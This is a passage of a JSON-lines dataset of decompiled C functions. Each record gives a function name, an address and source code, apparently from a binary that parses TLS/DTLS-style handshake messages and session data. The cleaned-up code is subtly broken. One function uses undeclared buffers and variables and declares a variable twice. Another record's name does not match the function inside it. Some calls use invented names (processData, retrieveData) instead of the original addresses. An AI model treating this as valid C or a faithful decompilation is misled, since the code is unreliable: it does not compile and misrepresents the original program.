free(pvVar12); \nLAB_004323af:\n    param_1[0x447a] = 0; \n    *(undefined *)(param_1 + 0x447b) = 0; \n    return 0xfffffffe; \n}"}
{"Function Name": "FUN_00432490", "Address": "00432490", "Source Code": "int FUN_00432490(long input_address, undefined *data_buffer, int data_length, code *callback_function)\n{\n    char current_char; \n    int byte_value; \n    int calculated_value; \n    uint status_code; \n    undefined8 result_value; \n    uint increment_value; \n    int remaining_length; \n    uint local_counter; \n    int local_array[3]; \n    \n    if (*(char *)(input_address + 0x22388) == -1) {\n        result_value = FUN_00431b00(input_address, 0, 100); \n        FUN_0042ab40(result_value); \n        return 1; \n    }\n    \n    \n    if (3 < data_length) {\n        current_char = *(char *)(input_address + 0x22389); \n        remaining_length = data_length; \n        \n        \n        while (current_char == '\\0') {\n            local_counter = 0; \n            local_array[0] = 0; \n            \n            \n            byte_value = ((uint)(byte)data_buffer[1] * 0x100 + (uint)(byte)data_buffer[2]) * 0x100 + (uint)(byte)data_buffer[3];\n            current_char = *(char *)(input_address + 0x223c9); \n            \n            \n            calculated_value = byte_value + (current_char != '\\0' ? 0xb : 3);\n            increment_value = calculated_value + 1; \n            \n            \n            if (remaining_length < (int)increment_value) {\n                return 0; \n            }\n            \n            \n            switch (*data_buffer) {\n                case 0:\n                    \n                    if (*(char *)(input_address + 0x223ed) == '\\0') {\n                        *(undefined *)(input_address + 0x223ed) = 1; \n                        if (current_char != '\\0') {\n                            *(undefined *)(input_address + 0x223d9) = 0; \n                        }\n                        \n                        if (*(char *)(input_address + 0x66) != '\\0') goto LAB_00432970; \n                        calculated_value = (*(char *)(input_address + 0x22388) == -1) ? -0x10 : -6; \n                    } else {\n                    LAB_00432970:\n                        calculated_value = -6; \n                    }\n                    goto LAB_00432980; \n                case 1:\n                    \n                    if ((int)(uint)*(byte *)(input_address + 0x223ee) < (int)(2 - (uint)(current_char == '\\0')) && \n                        (*(byte *)(input_address + 0x223ee) += 1, *(char *)(input_address + 0x66) != '\\0')) {\n                        calculated_value = FUN_00431bb0(input_address, data_buffer + 1, calculated_value, &local_counter, local_array); \n                        \n                        if ((*(char *)(input_address + 0x223c9) == '\\0') || (calculated_value < 1)) {\n                            status_code = 0xff; \n                        } else {\n                            status_code = 0xff; \n                            \n                            if ((local_array[0] == 0) && (*(char *)(input_address + 0x22388) == '\\x01')) {\n                                *(undefined *)(input_address + 0x22388) = 3; \n                                goto LAB_004325bb; \n                            }\n                        }\n                    } else {\n                    LAB_00432578:\n                        status_code = 0xff; \n                        calculated_value = -6; \n                    }\n                    break;\n                case 2:\n                    \n                    if ((*(char *)(input_address + 0x223ef) != '\\0') || \n                        (*(undefined *)(input_address + 0x223ef) = 1, *(char *)(input_address + 0x66) != '\\0')) \n                        goto LAB_00432578; \n                    status_code = 0xff; \n                    calculated_value = FUN_00431bb0(input_address, data_buffer + 1, calculated_value, &local_counter, local_array); \n                    break;\n                case 3:\n                    \n                    if (((*(char *)(input_address + 0x223f0) != '\\0') || \n                        (*(undefined *)(input_address + 0x223f0) = 1, current_char == '\\0')) || \n                        (*(char *)(input_address + 0x66) != '\\0')) \n                        goto LAB_00432578; \n                    calculated_value = FUN_0042c750(input_address, data_buffer + 1, calculated_value, &local_counter); \n                    goto LAB_004325bb; \n                default:\n                    return -3; \n                case 0xb:\n                    \n                    if ((*(char *)(input_address + 0x223f1) != '\\0') || \n                        (*(undefined *)(input_address + 0x223f1) = 1, *(char *)(input_address + 0x22388) != '\\x01')) \n                        goto LAB_00432578; \n                    \n                    if (*(char *)(input_address + 0x66) == '\\0') {\n                        calculated_value = FUN_00430e20(input_address, data_buffer + 1, calculated_value, 0); \n                        if (callback_function == (code *)0x0) goto LAB_00432c8e; \n                        status_code = 0xff; \n                        \n                        if (*(int *)(input_address + 0xb0) != 0) {\n                            status_code = (*callback_function)(input_address, *(undefined8 *)(input_address + 0x68)); \n                        }\n                    } else {\n                        calculated_value = FUN_00430e20(input_address, data_buffer + 1, calculated_value, 1); \n                        if (callback_function == (code *)0x0) {\n                            status_code = 0xff; \n                        } else {\n                            status_code = 0xff; \n                            \n                            if (*(int *)(input_address + 0xb4) != 0) {\n                                status_code = (*callback_function)(input_address, *(undefined8 *)(input_address + 0xa8)); \n                            }\n                        }\n                        \n                        if (calculated_value < 1) {\n                            calculated_value = 1; \n                        }\n                    }\n                    break;\n                case 0xc:\n                    \n                    if ((*(char *)(input_address + 0x223f2) != '\\0') || \n                        (*(undefined *)(input_address + 0x223f2) = 1, *(char *)(input_address + 0x66) != '\\0')) \n                        goto LAB_00432578; \n                    status_code = 0xff; \n                    calculated_value = FUN_0042cc80(input_address, data_buffer + 1, calculated_value); \n                    break;\n                case 0xd:\n                    \n                    if ((*(char *)(input_address + 0x223f3) != '\\0') || \n                        (*(undefined *)(input_address + 0x223f3) = 1, *(char *)(input_address + 0x66) != '\\0')) \n                        goto LAB_00432578; \n                    *(undefined *)(input_address + 0x223ec) = 2; \n                    status_code = 0xff; \n                    calculated_value = 0; \n                    break;\n                case 0xe:\n                    \n                    if ((*(char *)(input_address + 0x223f4) != '\\0') || \n                        (*(undefined *)(input_address + 0x223f4) = 1, *(char *)(input_address + 0x66) != '\\0')) \n                        goto LAB_00432578; \n                    status_code = 0xff; \n                    calculated_value = FUN_0042d340(input_address, data_buffer + 1, calculated_value); \n                    if (0 < calculated_value) {\n                        local_counter = 1; \n                    }\n                    break;\n                case 0xf:\n                    \n                    if ((*(char *)(input_address + 0x223f5) != '\\0') || \n                        (*(undefined *)(input_address + 0x223f5) = 1, *(char *)(input_address + 0x22388) != '\\x02')) \n                        goto LAB_00432578; \n                    status_code = 0xff; \n                    calculated_value = FUN_0042d600(input_address, data_buffer + 1, calculated_value); \n                    break;\n                case 0x10:\n                    \n                    if ((*(char *)(input_address + 0x223f6) != '\\0') || \n                        (*(undefined *)(input_address + 0x223f6) = 1, *(char *)(input_address + 0x66) == '\\0')) \n                        goto LAB_00432578; \n                    status_code = 0xff; \n                    calculated_value = FUN_0042d270(input_address, data_buffer + 1, calculated_value); \n                    break;\n                case 0x14:\n                    \n                    if (*(void **)(input_address + 0x223e0) != (void *)0x0) {\n                        free(*(void **)(input_address + 0x223e0)); \n                        *(undefined8 *)(input_address + 0x223e0) = 0; \n                        *(undefined4 *)(input_address + 0x223e8) = 0; \n                    }\n                    \n                    if (*(char *)(input_address + 0x223f7) != '\\0') goto LAB_00432578; \n                    *(undefined *)(input_address + 0x223f7) = 1; \n                    status_code = 0xff; \n                    calculated_value = FUN_0042d3c0(input_address, data_buffer + 1, calculated_value, &local_counter); \n                    \n                    if (0 < calculated_value) {\n                        *(undefined8 *)(input_address + 0x223ed) = 0; \n                        *(undefined *)(input_address + 0x223f7) = 0; \n                        *(undefined2 *)(input_address + 0x223f5) = 0; \n                    }\n            }\n            FUN_0042a290(input_address, data_buffer, increment_value); \n            \n            if (status_code != 0xff) {\n                result_value = FUN_00431b00(input_address, 1, status_code & 0xff); \n                FUN_0042ab40(result_value); \n                *(undefined *)(input_address + 0x22389) = 1; \n            }\n        LAB_004325bb:\n            \n            if (calculated_value < 0) {\n            LAB_00432980:\n                \n                switch (calculated_value) {\n                    case -0x14:\n                        result_value = 0x15; \n                        break;\n                    default:\n                        goto switchD_0043298a_caseD_ffffffed; \n                    case -0x10:\n                        result_value = 100; \n                    LAB_00432b85:\n                        result_value = FUN_00431b00(input_address, 0, result_value); \n                        FUN_0042ab40(result_value); \n                        goto LAB_004325c4; \n                    case -0xf:\n                        result_value = 0x2b; \n                        break;\n                    case -0xe:\n                        result_value = 0x2a; \n                        \n                        if (*(char *)(input_address + 0x66) != '\\0') goto LAB_00432b85; \n                        break;\n                    case -10:\n                        result_value = 0x14; \n                        break;\n                    case -9:\n                    case -3:\n                        result_value = 0x50; \n                        break;\n                    case -8:\n                        result_value = 0x1e; \n                        break;\n                    case -6:\n                        result_value = 10; \n                        break;\n                    case -5:\n                        result_value = 0x47; \n                        break;\n                    case -2:\n                        result_value = 0x32; \n                }\n                result_value = FUN_00431b00(input_address, 1, result_value); \n                FUN_0042ab40(result_value); \n            switchD_0043298a_caseD_ffffffed:\n                return calculated_value; \n            }\n        LAB_004325c4:\n            \n            if (local_counter == 2) {\n                \n                if ((*(char *)(input_address + 0x223c9) == '\\0') || (local_array[0] != 0)) {\n                    result_value = FUN_0042e8f0(input_address); \n                    FUN_0042ab40(result_value); \n                    result_value = FUN_004314e0(input_address); \n                    FUN_0042ab40(result_value); \n                    calculated_value = FUN_0042b990(input_address); \n                    \n                    if (calculated_value != 0) {\n                        result_value = FUN_0042e220(input_address); \n                        FUN_0042ab40(result_value); \n                    }\n                    \n                    if (*(char *)(input_address + 0x223c8) != '\\0') {\n                        result_value = FUN_0042f140(input_address); \n                        FUN_0042ab40(result_value); \n                    }\n                    result_value = FUN_00431980(input_address); \n                    FUN_0042ab40(result_value); \n                } else {\n                    result_value = FUN_0042f3e0(input_address); \n                    FUN_0042ab40(result_value); \n                    FUN_0042c700(input_address); \n                }\n            } else if (local_counter < 3) {\n                \n                if (local_counter == 1) {\n                    \n                    if (*(char *)(input_address + 0x223ec) == '\\x02') {\n                        result_value = FUN_004314e0(input_address); \n                        FUN_0042ab40(result_value); \n                        *(undefined *)(input_address + 0x223ec) = 0; \n                    }\n                    result_value = FUN_0042df90(input_address); \n                    FUN_0042ab40(result_value); \n                    result_value = FUN_00431920(input_address); \n                    FUN_0042ab40(result_value); \n                    *(undefined *)(input_address + 0xd4) = 1; \n                    *(undefined8 *)(input_address + 0x22380) = 0; \n                    result_value = FUN_00431770(input_address); \n                    FUN_0042ab40(result_value); \n                    *(undefined *)(input_address + 0xd4) = 0; \n                }\n            } else if (local_counter == 3) {\n                result_value = FUN_00431920(input_address); \n                FUN_0042ab40(result_value); \n                result_value = FUN_00431770(input_address); \n                FUN_0042ab40(result_value); \n                *(undefined *)(input_address + 0x22388) = 0xff; \n            } else if (local_counter == 4) {\n                *(undefined *)(input_address + 0x223d9) = 1; \n                result_value = FUN_0042e8f0(input_address); \n                FUN_0042ab40(result_value); \n            }\n            remaining_length -= increment_value; \n            data_buffer += increment_value; \n            \n            if (remaining_length < 4) {\n                return data_length; \n            }\n            current_char = *(char *)(input_address + 0x22389); \n        }\n    }\n    return data_length; \n}"}
{"Function Name": "FUN_00433830", "Address": "00433830", "Source Code": "ulong FUN_00433830(long inputPointer, void *dataPointer, int dataSize, undefined8 callbackFunction)\n{\n    ulong returnValue; \n    uint currentSize, calculatedSize, counter; \n    void *allocatedMemory; \n    if (inputPointer == 0) { \n        returnValue = 0xffffffff; \n    } else if (*(char *)(inputPointer + 0x22389) == '\\0') { \n        if (dataSize <= 0) { \n            returnValue = 0xfffffff3; \n            return returnValue; \n        }\n        if (dataPointer == (void *)0x0) { \n            *(undefined *)(inputPointer + 0x22389) = 1; \n            return 0xfffffff7; \n        }\n        currentSize = *(uint *)(inputPointer + 0x22370); \n        counter = dataSize + currentSize; \n        *(uint *)(inputPointer + 0x22370) = counter; \n        allocatedMemory = realloc(*(void **)(inputPointer + 0x22368), (ulong)counter); \n        *(void **)(inputPointer + 0x22368) = allocatedMemory; \n        if (allocatedMemory == (void *)0x0) { \n            *(undefined4 *)(inputPointer + 0x22370) = 0; \n            return 0xfffffff7; \n        }\n        memcpy((void *)((long)allocatedMemory + (ulong)currentSize), dataPointer, (long)dataSize); \n        currentSize = *(uint *)(inputPointer + 0x22370); \n        uint firstChar = *(char *)(inputPointer + 0x223c9); \n        uint secondChar = *(char *)(inputPointer + 0x223c9); \n        counter = 0; \n        if (4 < currentSize) { \n            do {\n                ushort ushortValue = *(ushort *)(*(long *)(inputPointer + 0x22368) + (ulong)(counter + (-(uint)(firstChar == '\\0') & 0xfffffff8) + 0xb)); \n                calculatedSize = (uint)(ushort)(ushortValue >> 8 | ushortValue << 8) + (-(uint)(secondChar == '\\0') & 0xfffffff8) + 0xd; \n                if (currentSize < calculatedSize) break; \n                returnValue = FUN_00432d00(inputPointer, (ulong)counter + *(long *)(inputPointer + 0x22368), calculatedSize, callbackFunction); \n                if ((int)returnValue < 0) { \n                    if (*(char *)(inputPointer + 0x22389) == '\\0') { \n                        *(undefined *)(inputPointer + 0x22389) = 1; \n                    }\n                    *(undefined4 *)(inputPointer + 0x22370) = 0; \n                    if (*(void **)(inputPointer + 0x22368) != (void *)0x0) { \n                        free(*(void **)(inputPointer + 0x22368)); \n                    }\n                    *(undefined8 *)(inputPointer + 0x22368) = 0; \n                    return returnValue; \n                }\n                counter += calculatedSize; \n                currentSize -= calculatedSize; \n                if (*(char *)(inputPointer + 0x22389) != '\\0') { \n                    returnValue = 0xfffffff3; \n                    goto cleanup; \n                }\n            } while (4 < currentSize); \n        }\n        if (counter != 0) { \n            allocatedMemory = *(void **)(inputPointer + 0x22368); \n            currentSize -= counter; \n            *(uint *)(inputPointer + 0x22370) = currentSize; \n            if (currentSize != 0) { \n                memmove(allocatedMemory, (void *)((ulong)counter + (long)allocatedMemory), (ulong)currentSize); \n                return (ulong)counter; \n            }\n            if (allocatedMemory != (void *)0x0) { \n                free(allocatedMemory); \n            }\n            *(undefined8 *)(inputPointer + 0x22368) = 0; \n            return (ulong)counter; \n        }\n    }\n    returnValue = 0; \ncleanup:\n    return returnValue; \n}"}
{"Function Name": "FUN_00433a50", "Address": "00433a50", "Source Code": "void FUN_00433a50(long inputAddress)\n{\n    \n    if ((inputAddress != 0) && (*(char *)(inputAddress + 0x22389) == '\\0')) {\n        \n        *(undefined *)(inputAddress + 0x22389) = 1;\n        \n        processData(retrieveData(inputAddress, 0, 0));\n    }\n}"}
{"Function Name": "FUN_00433a80", "Address": "00433a80", "Source Code": "void FUN_00433a80(long input_pointer, char input_char, undefined undefined_value)\n{\n    \n    if (input_pointer != 0) {\n        \n        if ((*(char *)(input_pointer + 0x22389) == '\\0') && (input_char != '\\0')) {\n            \n            *(undefined *)(input_pointer + 0x22389) = 1;\n        }\n        \n        FUN_0042ab40(FUN_00431b00(input_pointer, (int)input_char, undefined_value));\n    }\n}"}
{"Function Name": "FUN_00433ad0", "Address": "00433ad0", "Source Code": "undefined4 checkValue(long address)\n{\n    \n    if (*(long *)(address + 0x22368) != 0) {\n        \n        return *(undefined4 *)(address + 0x22370);\n    }\n    \n    return 0;\n}"}
{"Function Name": "FUN_00433af0", "Address": "00433af0", "Source Code": "void FUN_00433af0(long address, char value)\n{\n    \n    *(char *)(address + 0x223ad) = value;\n    \n    if (value != '\\0') {\n        return; \n    }\n    \n    void *pointer = *(void **)(address + 0x223b0);\n    \n    if (pointer != (void *)0x0 && *(byte *)(address + 0x223b8) != 0) {\n        \n        memset(pointer, 0, (ulong)*(byte *)(address + 0x223b8));\n    }\n    \n    free(pointer);\n    \n    *(undefined *)(address + 0x223b8) = 0;\n}"}
{"Function Name": "FUN_00434100", "Address": "00434100", "Source Code": "long FUN_00434100(char *input_buffer, uint input_length)\n{\n    long result_pointer; \n    void *memory_pointer; \n    undefined8 *undefined_pointer; \n    byte byte_value; \n    byte another_byte_value; \n    byte initialized_byte; \n    ushort unsigned_short_value; \n    uint unsigned_int_value; \n    uint another_unsigned_int_value; \n    int index_value; \n    int another_index_value; \n    int function_return_value; \n    long loop_counter; \n    long another_loop_counter; \n    long result_pointer; \n    initialized_byte = 0; \n    \n    if (input_buffer == (char *)0x0 || input_length < 0x40 || *input_buffer != -2 || input_buffer[5] != '\\x01') {\n        return 0; \n    }\n    result_pointer = FUN_0042afb0(0, 0x303); \n    if (result_pointer == 0) {\n        return 0; \n    }\n    \n    *(ushort *)(result_pointer + 100) = *(ushort *)(input_buffer + 1) >> 8 | *(ushort *)(input_buffer + 1) << 8;\n    \n    if ((uint)(ushort)(*(ushort *)(input_buffer + 3) >> 8 | *(ushort *)(input_buffer + 3) << 8) != input_length - 5) {\n        goto LAB_004345c8; \n    }\n    *(char *)(result_pointer + 0x22388) = input_buffer[6]; \n    \n    *(ushort *)(result_pointer + 0x62) = *(ushort *)(input_buffer + 7) >> 8 | *(ushort *)(input_buffer + 7) << 8;\n    \n    if (input_buffer[9] == '\\x02') {\n        *(undefined *)(result_pointer + 0x66) = 1; \n        *(undefined *)(result_pointer + 0x223ac) = 1; \n    } else {\n        *(char *)(result_pointer + 0x66) = input_buffer[9]; \n    }\n    byte_value = input_buffer[10]; \n    \n    if (0x10 < byte_value) {\n        goto LAB_004345c8; \n    }\n    memcpy(buffer_158, input_buffer + 0xb, (ulong)byte_value); \n    function_return_value = byte_value + 0xb + (uint)byte_value; \n    index_value = function_return_value + 1; \n    memcpy(buffer_148, input_buffer + (int)(byte_value + 0xb), (ulong)byte_value); \n    another_byte_value = input_buffer[function_return_value]; \n    \n    if (((int)(input_length - index_value) < (int)(uint)another_byte_value) || ((int)input_length < index_value)) {\n        goto LAB_004345c8; \n    }\n    memcpy(buffer_138, input_buffer + index_value, (ulong)another_byte_value); \n    *(undefined *)(result_pointer + 0x223ad) = 0; \n    index_value += (uint)another_byte_value; \n    function_return_value = FUN_004268b0(result_pointer); \n    \n    if (function_return_value == 2) {\n        temporary_byte_value = 0xc; \n        if (byte_value < 0xc) {\n            temporary_byte_value = byte_value; \n        }\n        memcpy((void *)(result_pointer + 0x222f8), buffer_158, (ulong)temporary_byte_value); \n        memcpy((void *)(result_pointer + 0x22328), buffer_148, (ulong)temporary_byte_value); \n    } else if (function_return_value != 0) {\n        temporary_byte_value = 4; \n        if (byte_value < 4) {\n            temporary_byte_value = byte_value; \n        }\n        memcpy((void *)(result_pointer + 0x222f8), buffer_158, (ulong)temporary_byte_value); \n        memcpy((void *)(result_pointer + 0x22328), buffer_148, (ulong)temporary_byte_value); \n    }\n    another_byte_value >>= 1; \n    \n    if (*(char *)(result_pointer + 0x66) == '\\0') {\n        \n        another_index_value = FUN_004293a0(result_pointer, another_byte_value, (ulong)another_byte_value + (long)buffer_138, buffer_148, buffer_138, buffer_158);\n    } else {\n        \n        another_index_value = FUN_004293a0(result_pointer, another_byte_value, buffer_138, buffer_158, (long)buffer_138 + (ulong)another_byte_value, buffer_148);\n    }\n    \n    if (another_index_value == 0) {\n        undefined_pointer = buffer_138; \n        for (loop_counter = 0x1f; loop_counter != 0; loop_counter--) { \n            *undefined_pointer = 0; \n            undefined_pointer++; \n        }\n        *(undefined2 *)((long)undefined_pointer + 4) = 0; \n        *(undefined4 *)undefined_pointer = 0; \n        *(undefined *)((long)undefined_pointer + 6) = 0; \n        initialized_byte = input_buffer[index_value]; \n        another_index_value = index_value + 1; \n        \n        if (initialized_byte < 0x31) {\n            \n            if (initialized_byte == 0) {\n                \n                if (function_return_value == 2) {\n                    \n                    if (((int)(input_length - another_index_value) < 0x100) || (loop_counter = result_pointer, (int)input_length < another_index_value)) {\n                        goto LAB_004345c8; \n                    }\n                    do {\n                        another_loop_counter = (long)another_index_value; \n                        another_index_value += 4; \n                        another_unsigned_int_value = *(uint *)(input_buffer + another_loop_counter); \n                        \n                        *(uint *)(loop_counter + 0xd8) = another_unsigned_int_value >> 0x18 | (another_unsigned_int_value & 0xff0000) >> 8 | (another_unsigned_int_value & 0xff00) << 8 | another_unsigned_int_value << 0x18;\n                        loop_counter += 4; \n                    } while (another_index_value != index_value + 0x41); \n                    function_return_value = index_value + 0x41; \n                    loop_counter = result_pointer; \n                    do {\n                        another_loop_counter = (long)function_return_value; \n                        function_return_value += 4; \n                        another_unsigned_int_value = *(uint *)(input_buffer + another_loop_counter); \n                        \n                        *(uint *)(loop_counter + 0x111e8) = another_unsigned_int_value >> 0x18 | (another_unsigned_int_value & 0xff0000) >> 8 | (another_unsigned_int_value & 0xff00) << 8 | another_unsigned_int_value << 0x18;\n                        loop_counter += 4; \n                    } while (function_return_value != index_value + 0x81); \n                    undefined_pointer = (undefined8 *)(input_buffer + (index_value + 0x81)); \n                    \n                    *(undefined8 *)(result_pointer + 0x118) = *undefined_pointer;\n                    *(undefined8 *)(result_pointer + 0x120) = undefined_pointer[1];\n                    *(undefined8 *)(result_pointer + 0x128) = undefined_pointer[2];\n                    *(undefined8 *)(result_pointer + 0x130) = undefined_pointer[3];\n                    *(undefined8 *)(result_pointer + 0x138) = undefined_pointer[4];\n                    *(undefined8 *)(result_pointer + 0x140) = undefined_pointer[5];\n                    *(undefined8 *)(result_pointer + 0x148) = undefined_pointer[6];\n                    *(undefined8 *)(result_pointer + 0x150) = undefined_pointer[7];\n                    another_index_value = index_value + 0x101; \n                    undefined_pointer = (undefined8 *)(input_buffer + (index_value + 0xc1)); \n                    \n                    *(undefined8 *)(result_pointer + 0x11228) = *undefined_pointer;\n                    *(undefined8 *)(result_pointer + 0x11230) = undefined_pointer[1];\n                    *(undefined8 *)(result_pointer + 0x11238) = undefined_pointer[2];\n                    *(undefined8 *)(result_pointer + 0x11240) = undefined_pointer[3];\n                    *(undefined8 *)(result_pointer + 0x11248) = undefined_pointer[4];\n                    *(undefined8 *)(result_pointer + 0x11250) = undefined_pointer[5];\n                    *(undefined8 *)(result_pointer + 0x11258) = undefined_pointer[6];\n                    *(undefined8 *)(result_pointer + 0x11260) = undefined_pointer[7];\n                }\n            } else {\n                \n                if (((int)(input_length - another_index_value) < (int)(uint)initialized_byte) || ((int)input_length < another_index_value)) {\n                    goto LAB_004345c8; \n                }\n                index_value = another_index_value + (uint)initialized_byte; \n                memcpy((void *)(result_pointer + 0x222f8), input_buffer + another_index_value, (ulong)initialized_byte); \n                \n                if (((int)(input_length - index_value) < (int)(uint)initialized_byte) || ((int)input_length < index_value)) {\n                    goto LAB_004345c8; \n                }\n                another_index_value = index_value + (uint)initialized_byte; \n                memcpy((void *)(result_pointer + 0x22328), input_buffer + index_value, (ulong)initialized_byte); \n            }\n            \n            if ((1 < (int)(input_length - another_index_value)) && (another_index_value <= (int)input_length)) {\n                index_value = another_index_value + 2; \n                unsigned_short_value = *(ushort *)(input_buffer + another_index_value) >> 8 | *(ushort *)(input_buffer + another_index_value) << 8; \n                \n                if (unsigned_short_value != 0) {\n                    \n                    if (((int)(input_length - index_value) < (int)(uint)unsigned_short_value) || ((int)input_length < index_value)) {\n                        goto LAB_004345c8; \n                    }\n                    memory_pointer = malloc((ulong)unsigned_short_value); \n                    *(void **)(result_pointer + 0xb8) = memory_pointer; \n                    \n                    if (memory_pointer != (void *)0x0) {\n                        memcpy(memory_pointer, input_buffer + index_value, (ulong)unsigned_short_value); \n                        *(uint *)(result_pointer + 0xc0) = (uint)unsigned_short_value; \n                    }\n                    index_value += (uint)unsigned_short_value; \n                }\n                \n                if ((0xf < (int)(input_length - index_value)) && (index_value <= (int)input_length)) {\n                    another_unsigned_int_value = (uint)*(undefined8 *)(input_buffer + index_value); \n                    unsigned_int_value = (uint)((ulong)*(undefined8 *)(input_buffer + index_value) >> 0x20); \n                    \n                    *(ulong *)(result_pointer + 0x22380) = CONCAT44(another_unsigned_int_value >> 0x18 | (another_unsigned_int_value & 0xff0000) >> 8 | (another_unsigned_int_value & 0xff00) << 8 | another_unsigned_int_value << 0x18, unsigned_int_value >> 0x18 | (unsigned_int_value & 0xff0000) >> 8 | (unsigned_int_value & 0xff00) << 8 | unsigned_int_value << 0x18);\n                    another_unsigned_int_value = (uint)*(undefined8 *)(input_buffer + (index_value + 8)); \n                    unsigned_int_value = (uint)((ulong)*(undefined8 *)(input_buffer + (index_value + 8)) >> 0x20); \n                    \n                    *(ulong *)(result_pointer + 0x22378) = CONCAT44(another_unsigned_int_value >> 0x18 | (another_unsigned_int_value & 0xff0000) >> 8 | (another_unsigned_int_value & 0xff00) << 8 | another_unsigned_int_value << 0x18, unsigned_int_value >> 0x18 | (unsigned_int_value & 0xff0000) >> 8 | (unsigned_int_value & 0xff00) << 8 | unsigned_int_value << 0x18);\n                    function_return_value = index_value + 0x10; \n                    \n                    if ((3 < (int)(input_length - function_return_value)) && (function_return_value <= (int)input_length)) {\n                        index_value += 0x14; \n                        another_unsigned_int_value = *(uint *)(input_buffer + function_return_value); \n                        another_unsigned_int_value = another_unsigned_int_value >> 0x18 | (another_unsigned_int_value & 0xff0000) >> 8 | (another_unsigned_int_value & 0xff00) << 8 | another_unsigned_int_value << 0x18; \n                        \n                        if (((int)another_unsigned_int_value <= (int)(input_length - index_value)) && (index_value <= (int)input_length)) {\n                            \n                            if (another_unsigned_int_value == 0) {\n                                \n                                if ((int)(input_length - index_value) < 4) {\n                                    goto LAB_004345c8; \n                                }\n                            } else {\n                                memory_pointer = malloc((ulong)another_unsigned_int_value); \n                                *(void **)(result_pointer + 0x22390) = memory_pointer; \n                                \n                                if (memory_pointer != (void *)0x0) {\n                                    memcpy(memory_pointer, input_buffer + index_value, (ulong)another_unsigned_int_value); \n                                    *(uint *)(result_pointer + 0x22398) = another_unsigned_int_value; \n                                }\n                                index_value += another_unsigned_int_value; \n                                \n                                if (((int)(input_length - index_value) < 4) || ((int)input_length < index_value)) {\n                                    goto LAB_004345c8; \n                                }\n                            }\n                            function_return_value = index_value + 4; \n                            another_unsigned_int_value = *(uint *)(input_buffer + index_value); \n                            another_unsigned_int_value = another_unsigned_int_value >> 0x18 | (another_unsigned_int_value & 0xff0000) >> 8 | (another_unsigned_int_value & 0xff00) << 8 | another_unsigned_int_value << 0x18; \n                            \n                            if (((int)another_unsigned_int_value <= (int)(input_length - function_return_value)) && (function_return_value <= (int)input_length)) {\n                                \n                                if (another_unsigned_int_value == 0) {\n                                    \n                                    if ((int)(input_length - function_return_value) < 4) {\n                                        goto LAB_004345c8; \n                                    }\n                                } else {\n                                    memory_pointer = malloc((ulong)another_unsigned_int_value); \n                                    *(void **)(result_pointer + 0x22368) = memory_pointer; \n                                    \n                                    if (memory_pointer != (void *)0x0) {\n                                        memcpy(memory_pointer, input_buffer + function_return_value, (ulong)another_unsigned_int_value); \n                                        *(uint *)(result_pointer + 0x22370) = another_unsigned_int_value; \n                                    }\n                                    function_return_value += another_unsigned_int_value; \n                                    \n                                    if (((int)(input_length - function_return_value) < 4) || ((int)input_length < function_return_value)) {\n                                        goto LAB_004345c8; \n                                    }\n                                }\n                                index_value = function_return_value + 4; \n                                another_unsigned_int_value = *(uint *)(input_buffer + function_return_value); \n                                *(undefined *)(result_pointer + 0xd4) = 1; \n                                another_unsigned_int_value = another_unsigned_int_value >> 0x18 | (another_unsigned_int_value & 0xff0000) >> 8 | (another_unsigned_int_value & 0xff00) << 8 | another_unsigned_int_value << 0x18; \n                                \n                                if (((int)another_unsigned_int_value <= (int)(input_length - index_value)) && (index_value <= (int)input_length)) {\n                                    \n                                    if (another_unsigned_int_value == 0) {\n                                        \n                                        if ((int)(input_length - index_value) < 1) {\n                                            goto LAB_004345c8; \n                                        }\n                                    } else {\n                                        memory_pointer = malloc((ulong)another_unsigned_int_value); \n                                        *(void **)(result_pointer + 0x223a0) = memory_pointer; \n                                        \n                                        if (memory_pointer != (void *)0x0) {\n                                            memcpy(memory_pointer, input_buffer + index_value, (ulong)another_unsigned_int_value); \n                                            *(uint *)(result_pointer + 0x223a8) = another_unsigned_int_value; \n                                        }\n                                        index_value += another_unsigned_int_value; \n                                        \n                                        if (((int)(input_length - index_value) < 1) || ((int)input_length < index_value)) {\n                                            goto LAB_004345c8; \n                                        }\n                                    }\n                                    char_value = input_buffer[index_value]; \n                                    *(char *)(result_pointer + 0x223c9) = char_value; \n                                    \n                                    if (char_value == '\\0') {\n                                        return result_pointer; \n                                    }\n                                    function_return_value = index_value + 1; \n                                    \n                                    if ((3 < (int)(input_length - function_return_value)) && (function_return_value <= (int)input_length)) {\n                                        \n                                        *(ushort *)(result_pointer + 0x223ca) = *(ushort *)(input_buffer + function_return_value) >> 8 | *(ushort *)(input_buffer + function_return_value) << 8;\n                                        *(ushort *)(result_pointer + 0x223cc) = *(ushort *)(input_buffer + (index_value + 3)) >> 8 | *(ushort *)(input_buffer + (index_value + 3)) << 8;\n                                        return result_pointer; \n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\nLAB_004345c8:\n    FUN_0042bf20(result_pointer); \n    return 0; \n}"}
{"Function Name": "FUN_00434850", "Address": "00434850", "Source Code": "undefined8 FUN_00434850(long input_pointer)\n{\n    \n    if (input_pointer != 0 && *(char *)(input_pointer + 0x66) != '\\0') {\n        \n        *(undefined *)(input_pointer + 0x223c8) = 1;\n        \n        return 1;\n    }\n    \n    return 0;\n}"}
{"Function Name": "FUN_004348b0", "Address": "004348b0", "Source Code": "undefined8 FUN_004348b0(long input_parameter)\n{\n    \n    return input_parameter != 0 ? \n        \n        *(undefined8 *)(input_parameter + 0x223c0) : \n        \n        0;\n}"}
{"Function Name": "FUN_004348d0", "Address": "004348d0", "Source Code": "undefined8 FUN_004348d0(long inputPointer, char *inputString)\n{\n    \n    if (((inputPointer != 0) && (*(char *)(inputPointer + 0x66) == '\\0')) &&\n        (*(short *)(inputPointer + 0x22388) == 0)) {\n        \n        \n        void **memoryPointer = (void **)(inputPointer + 0x223c0);\n        \n        \n        if (*memoryPointer != (void *)0x0) {\n            free(*memoryPointer);\n        }\n        \n        \n        *memoryPointer = 0;\n        \n        \n        if (inputString != (char *)0x0) {\n            \n            size_t stringLength = strlen(inputString);\n            \n            \n            if (stringLength != 0) {\n                \n                void *allocatedMemory = malloc(stringLength + 1);\n                \n                \n                *memoryPointer = allocatedMemory;\n                \n                \n                if (allocatedMemory != (void *)0x0) {\n                    \n                    *(undefined *)((long)allocatedMemory + stringLength) = 0;\n                    \n                    \n                    memcpy(allocatedMemory, inputString, stringLength);\n                    \n                    \n                    return 1;\n                }\n            }\n        }\n    }\n    \n    \n    return 0;\n}"}
